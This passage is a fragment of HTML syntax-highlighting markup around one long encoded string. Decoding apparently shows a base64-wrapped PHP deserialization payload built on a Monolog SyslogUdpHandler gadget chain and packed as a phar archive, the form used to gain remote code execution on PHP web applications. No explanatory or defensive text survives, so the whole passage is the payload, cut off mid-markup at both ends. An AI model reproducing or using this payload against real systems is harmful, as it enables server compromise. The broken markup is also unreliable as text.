class="number">6</span>F=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=69=00=54</span>=<span class="number">00=57=00=39</span>=<span class="number">00=75=00=62</span>=<span class="number">00=32=00=78</span>=<span class="number">00</span>=<span class="number">76</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=31=00=78</span>=<span class="number">00=49=00=59</span>=<span class="number">00=57=00=35</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=62=00=47</span>=<span class="number">00=56=00=79</span>=<span class="number">00=58=00=46</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=35=00=63</span>=<span class="number">00=32=00=78</span>=<span class="number">00</span>=<span class="number">76</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=31=00=56</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=63=00=45</span>=<span class="number">00=68=00=68</span>=<span class="number">00</span>=<span class="number">62</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=52=00=73</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=58=00=49</span>=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=45=00=36</span>=<span class="number">00=65=00=33</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">54</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=69=00=41</span>=<span class="number">00</span>=<span class="number">43</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=41=00=63</span>=<span class="number">00=32=00=39</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=61=00=32</span>=<span class="number">00=56=00=30</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=74=00=50</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=49=00=35</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=62=00=32</span>=<span class="number">00=35=00=76</span>=<span class="number">00=62=00=47</span>=<span class="number">00</span>=<span class="number">39</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00=58=00=45</span>=<span class="number">00=68=00=68</span>=<span class="number">00</span>=<span class="number">62</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=52=00=73</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00=63=00=51</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">56</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=56=00=79</span>=<span class="number">00=53=00=47</span>=<span class="number">00=46=00=75</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=47=00=78</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=63=00=69</span>=<span class="number">00=49=00=36</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=70=00=37</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">44</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=69=00=41</span>=<span class="number">00</span>=<span class="number">43</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=41=00=61</span>=<span class="number">00=47=00=46</span>=<span class="number">00</span>=<span class="number">75</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=47=00=78</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=63=00=69</span>=<span class="number">00=49=00=37</span>=<span class="number">00</span>=<span class="number">54</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">79</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">54</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=69=00=54</span>=<span class="number">00=57=00=39</span>=<span class="number">00=75=00=62</span>=<span class="number">00=32=00=78</span>=<span class="number">00</span>=<span class="number">76</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=31=00=78</span>=<span class="number">00=49=00=59</span>=<span class="number">00=57=00=35</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=62=00=47</span>=<span class="number">00=56=00=79</span>=<span class="number">00=58=00=45</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">31</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=68=00=68</span>=<span class="number">00</span>=<span class="number">62</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=52=00=73</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=58=00=49</span>=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=63=00=36</span>=<span class="number">00=65=00=33</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00=54=00=41</span>=<span class="number">00=36=00=49</span>=<span class="number">00=67=00=41</span>=<span class="number">00=71=00=41</span>=<span class="number">00=47=00=68</span>=<span class="number">00=68=00=62</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=52=00=73</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=58=00=49</span>=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=30=00=34</span>=<span class="number">00=37=00=63</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=69=00=41</span>=<span class="number">00</span>=<span class="number">43</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=41=00=59</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">56</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=56=00=79</span>=<span class="number">00=55=00=32</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=53=00=49</span>=<span class="number">00=37=00=61</span>=<span class="number">00</span>=<span class="number">54</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">74</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00=54=00=74</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=36=00=49</span>=<span class="number">00=67=00=41</span>=<span class="number">00=71=00=41</span>=<span class="number">00</span>=<span class="number">47</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">31</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=63=00=69</span>=<span class="number">00=49=00=37</span>=<span class="number">00=59=00=54</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00=74=00=70</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=41=00=37</span>=<span class="number">00=59=00=54</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">79</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00=74=00=70</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=41=00=37</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">79</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">70</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=43=00=49</span>=<span class="number">00=37=00=63</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">31</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">73</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=62=00=43</span>=<span class="number">00=49=00=37</span>=<span class="number">00</span>=<span class="number">54</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=74=00=39</span>=<span class="number">00=66=00=58</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">44</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=69=00=41</span>=<span class="number">00</span>=<span class="number">43</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=41=00=62</span>=<span class="number">00=47=00=56</span>=<span class="number">00</span>=<span class="number">32</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=57=00=77</span>=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=30=00=34</span>=<span class="number">00=37=00=63</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">44</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=69=00=41</span>=<span class="number">00</span>=<span class="number">43</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=41=00=61</span>=<span class="number">00=57=00=35</span>=<span class="number">00=70=00=64</span>=<span class="number">00</span>=<span class="number">47</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=68=00=62</span>=<span class="number">00</span>=<span class="number">47</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=57=00=51</span>=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=32=00=49</span>=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00=54=00=74</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=45=00=30</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=69=00=49</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">4</span>B=<span class="number">00=67=00=42</span>=<span class="number">00=69=00=64</span>=<span class="number">00</span>=<span class="number">57</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00=61=00=57</span>=<span class="number">00=31=00=70</span>=<span class="number">00=64=00=43</span>=<span class="number">00=49=00=37</span>=<span class="number">00=61=00=54</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">74</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00=54=00=74</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">45</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=69=00=49</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">4</span>B=<span class="number">00=67=00=42</span>=<span class="number">00=77=00=63</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">39</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=62=00=33</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=74=00=68</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=49=00=36</span>=<span class="number">00=65=00=32</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00=44=00=74</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=63=00=36</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=31=00=63</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">62</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00=51=00=69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">32</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00=54=00=74</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=59=00=36</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=35=00=63</span>=<span class="number">00=33=00=52</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=62=00=53</span>=<span class="number">00=49=00=37</span>=<span class="number">00=66=00=58</span>=<span class="number">00</span>=<span class="number">31</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">45</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=69=00=49</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">4</span>B=<span class="number">00=67=00=42</span>=<span class="number">00=69=00=64</span>=<span class="number">00</span>=<span class="number">57</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00=54=00=61</span>=<span class="number">00=58=00=70</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=74=00=70</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=69=00=30</span>=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">33</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">54</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=69=00=41</span>=<span class="number">00</span>=<span class="number">43</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=41=00=59</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">56</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=56=00=79</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=74=00=68</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=45=00=36</span>=<span class="number">00=65=00=32</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00=44=00=74</span>=<span class="number">00</span>=<span class="number">68</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=49=00=36</span>=<span class="number">00=65=00=32</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00=44=00=74</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=49=00=36</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">74</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=55=00=36</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">64</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=56=00=73</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">74</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=33=00=31</span>=<span class="number">00=39=00=63</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">34</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=69=00=49</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">4</span>B=<span class="number">00=67=00=42</span>=<span class="number">00</span>=<span class="number">73</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=62=00=43</span>=<span class="number">00=49=00=37</span>=<span class="number">00</span>=<span class="number">54</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">74</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=45=00=30</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=69=00=49</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">4</span>B=<span class="number">00=67=00=42</span>=<span class="number">00=70=00=62</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=30=00=61</span>=<span class="number">00=57=00=46</span>=<span class="number">00=73=00=61</span>=<span class="number">00=58=00=70</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=43=00=49</span>=<span class="number">00=37=00=59</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">33</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00=54=00=51</span>=<span class="number">00=36=00=49</span>=<span class="number">00=67=00=41</span>=<span class="number">00=71=00=41</span>=<span class="number">00</span>=<span class="number">47</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">31</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=78=00=70</span>=<span class="number">00=62=00=57</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=30=00=49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=74=00=70</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=69=00=30</span>=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">33</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">54</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00=36=00=49</span>=<span class="number">00=67=00=41</span>=<span class="number">00=71=00=41</span>=<span class="number">00=48=00=42</span>=<span class="number">00=79=00=62</span>=<span class="number">00</span>=<span class="number">32</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=63=00=33</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=76=00=63</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=32=00=45</span>=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=70=00=37</span>=<span class="number">00=61=00=54</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">77</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">33</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=69=00=59</span>=<span class="number">00=33=00=56</span>=<span class="number">00=79=00=63</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=56=00=75</span>=<span class="number">00=64=00=43</span>=<span class="number">00=49=00=37</span>=<span class="number">00=61=00=54</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">33</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=69=00=63</span>=<span class="number">00</span>=<span class="number">33</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=64=00=47</span>=<span class="number">00=56=00=74</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=74=00=39</span>=<span class="number">00=66=00=58</span>=<span class="number">00=30=00=46</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=48=00=56</span>=<span class="number">00=74=00=62</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=45=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=47</span>=<span class="number">00=47=00=63</span>=<span class="number">00=49=00=59</span>=<span class="number">00=41=00=51</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">66</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">2</span>F=<span class="number">00=59=00=70</span>=<span class="number">00=41=00=45</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=49=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=64</span>=<span class="number">00=47=00=56</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=64=00=43</span>=<span class="number">00=35=00=30</span>=<span class="number">00=65=00=48</span>=<span class="number">00=51=00=45</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=47=00=47</span>=<span class="number">00=63=00=49</span>=<span class="number">00=59=00=41</span>=<span class="number">00=51=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">66</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">2</span>F=<span class="number">00=59=00=70</span>=<span class="number">00=41=00=45</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=42</span>=<span class="number">00</span>=<span class="number">30</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=30=00=64</span>=<span class="number">00=47=00=56</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=64=00=46</span>=<span class="number">00=75=00=79</span>=<span class="number">00=53=00=68</span>=<span class="number">00=78=00=45</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">52</span>=<span 